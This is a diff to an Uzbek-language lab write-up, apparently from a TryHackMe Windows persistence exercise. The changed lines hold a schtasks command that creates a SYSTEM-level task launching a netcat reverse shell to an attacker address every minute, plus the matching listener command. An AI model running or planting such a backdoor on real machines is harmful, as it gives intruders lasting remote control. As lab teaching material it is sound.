@@ -20,7 +20,7 @@ Windows’ning o‘zida mavjud bo‘lgan **Task Scheduler** eng keng tarqalgan r
 ### 📌 **Misol: Har daqiqada reverse shell ishga tushiruvchi vazifa yaratish**
 
 ```cmd
-C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.8.24.135 4444 " /ru SYSTEM
 ```
 
 **Tushuntirish:**
@@ -28,7 +28,7 @@ C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -
 * `/sc minute` – har daqiqada ishga tushirilsin
 * `/mo 1` – har 1 daqiqada
 * `/tn THM-TaskBackdoor` – vazifa nomi `THM-TaskBackdoor`
-* `/tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449"` – ishga tushiriladigan buyruq: bu yerda `nc64` orqali `cmd.exe` ni masofadagi hujumchiga ulaydi (reverse shell)
+* `/tr "c:\tools\nc64 -e cmd.exe 10.8.24.135 4444"` – ishga tushiriladigan buyruq: bu yerda `nc64` orqali `cmd.exe` ni masofadagi hujumchiga ulaydi (reverse shell)
 * `/ru SYSTEM` – SYSTEM huquqlari bilan ishga tushadi
 
 ✅ Bu buyruq muvaffaqiyatli bajarilgach, vazifa har daqiqada reverse shell yuboradi.
@@ -107,7 +107,7 @@ ERROR: The system cannot find the file specified.
 Hujumchi mashinasida listener ishga tushuramiz:
 
 ```bash
-user@AttackBox$ nc -lvp 4449
+user@AttackBox$ nc -lvp 4444
 ```
 
 Bir daqiqa ichida `cmd.exe` bilan ulanish bo‘ladi (reverse shell).
